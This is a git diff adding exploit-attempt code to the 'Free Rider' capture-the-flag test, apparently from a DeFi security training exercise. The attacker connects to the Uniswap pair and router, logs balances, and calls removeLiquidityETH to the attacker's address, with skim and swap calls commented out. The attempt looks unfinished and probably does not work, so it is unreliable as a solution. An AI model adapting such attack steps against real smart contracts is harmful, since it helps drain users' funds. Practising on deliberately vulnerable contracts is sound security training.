@@ -105,6 +105,24 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const uniswapPairAttack = this.uniswapPair.connect(attacker)
+        const routerAttack = this.uniswapRouter.connect(attacker)
+
+        console.log("Uni ETH: ", await this.weth.balanceOf(uniswapPairAttack.address))
+        console.log("Uni TOK: ", await this.token.balanceOf(uniswapPairAttack.address))
+        // await uniswapPairAttack.skim(attacker.address)
+        // await uniswapPairAttack.swap(ethers.utils.parseEther('8000'), ethers.utils.parseEther('8000'), attacker.address, [])
+        console.log("timestamp: ", await ethers.provider.getBlock(10))
+        const currentBlock = await ethers.provider.getBlock(10)
+        await routerAttack.removeLiquidityETH(
+          this.token.address,
+          ethers.utils.parseEther("100"),
+          ethers.utils.parseEther("100"),
+          ethers.utils.parseEther("100"),
+          attacker.address,
+          currentBlock.timestamp + 10000
+      ) 
+        console.log("ETH: ", await this.weth.balanceOf(attacker.address))
     });
 
     after(async function () {
